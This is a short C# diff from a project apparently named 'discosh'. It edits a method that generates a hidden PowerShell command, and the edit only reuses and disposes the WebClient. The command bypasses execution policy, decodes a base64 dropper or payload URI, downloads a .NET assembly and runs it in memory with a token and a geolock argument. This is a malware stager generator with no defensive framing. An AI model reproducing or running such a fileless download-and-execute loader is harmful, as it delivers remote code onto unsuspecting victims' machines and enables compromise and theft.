@@ -36,6 +36,6 @@ namespace discosh
             }
         }
 
-        public static string GenerateCommand(string token, string prefix, string geolock, bool ponly) => $"powershell -noprofile -executionpolicy bypass -windowstyle hidden -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{(ponly ? payload_uri : dropper_uri)}')))))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";
+        public static string GenerateCommand(string token, string prefix, string geolock, bool ponly) => $"powershell -noprofile -executionpolicy bypass -windowstyle hidden -command $wc = New-Object System.Net.WebClient;[System.Reflection.Assembly]::Load($wc.DownloadData([System.Text.Encoding]::UTF8.GetString($wc.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{(ponly ? payload_uri : dropper_uri)}')))))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')));$wc.Dispose()";
     }
 }
